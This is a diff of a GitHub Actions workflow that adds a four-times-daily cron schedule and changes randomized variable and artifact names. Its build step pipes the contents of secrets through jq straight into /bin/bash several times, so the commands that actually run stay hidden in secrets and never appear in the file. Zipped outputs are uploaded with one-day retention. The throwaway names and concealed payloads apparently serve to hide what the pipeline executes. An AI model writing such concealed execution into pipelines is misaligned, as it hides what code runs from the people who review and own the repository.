@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '35 3,9,15,21 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -15,19 +17,17 @@ jobs:
           fetch-depth: 1
       - name: Build and run
         env:
-          smhf8632: ${{ secrets.smhf8632 }}
+          hko3: ${{ secrets.hko3 }}
         run: |
-          printf '%s' "$smhf8632" | jq -r .yw98239 | /bin/bash
-          printf '%s' "$g875" | jq -r .vlv9 | /bin/bash
-          echo $eu2647 | jq -r .uqc80 | /bin/bash
-          echo $o04752 | jq -r .uvhm65 | /bin/bash
-          printf '%s' "$utrnz212" | jq -r .vktpj0 | /bin/bash
-          echo $voodk949 | jq -r .y098 | /bin/bash
+          printf '%s' "$hko3" | jq -r .szb1 | /bin/bash
+          printf '%s' "$tezs2681" | jq -r .uovh275 | /bin/bash
+          printf '%s' "$btcfr796" | jq -r .dsg1457 | /bin/bash
+          echo $ika4 | jq -r .huo42716 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: XIXVXKwG
+          name: E3J0xMQr
           path: "*.zip"
           retention-days: 1
